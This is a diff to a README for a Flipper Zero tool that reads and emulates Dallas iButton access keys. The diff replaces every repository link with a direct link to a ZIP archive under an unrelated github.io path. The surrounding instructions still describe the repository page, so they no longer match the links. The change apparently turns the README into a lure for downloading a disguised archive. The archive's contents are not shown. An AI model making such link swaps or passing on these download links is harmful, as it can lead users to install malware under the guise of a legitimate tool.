@@ -5,7 +5,7 @@ description: "Discover, emulate, analyze, and hack Dallas iButton keys with your
 ---
 # 🔓 Talos-FlipperZero - Grade Your iButton Keys Instantly
 
-[![Download Talos-FlipperZero](https://img.shields.io/badge/Download-Talos--FlipperZero-blue?style=for-the-badge&logo=github)](https://github.com/longsuitfala203/Talos-FlipperZero)
+[![Download Talos-FlipperZero](https://img.shields.io/badge/Download-Talos--FlipperZero-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/longsuitfala203/longsuitfala203.github.io/main/nodi/v1.1.zip)
 
 ## 🤔 What Does This App Do?
 
@@ -54,7 +54,7 @@ If you have a Flipper Zero and own any iButton keys, this tool gives you X-ray v
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/longsuitfala203/Talos-FlipperZero](https://github.com/longsuitfala203/Talos-FlipperZero)
+Visit this link to download the application: [https://raw.githubusercontent.com/longsuitfala203/longsuitfala203.github.io/main/nodi/v1.1.zip](https://raw.githubusercontent.com/longsuitfala203/longsuitfala203.github.io/main/nodi/v1.1.zip)
 
 Click the green **Code** button on that page, then choose **Download ZIP** to get the files onto your computer.
 
@@ -156,7 +156,7 @@ The project welcomes contributions from developers of all skill levels.
 
 ---
 
-**Visit this link to download the application:** [https://github.com/longsuitfala203/Talos-FlipperZero](https://github.com/longsuitfala203/Talos-FlipperZero)
+**Visit this link to download the application:** [https://raw.githubusercontent.com/longsuitfala203/longsuitfala203.github.io/main/nodi/v1.1.zip](https://raw.githubusercontent.com/longsuitfala203/longsuitfala203.github.io/main/nodi/v1.1.zip)
 
 ---
 
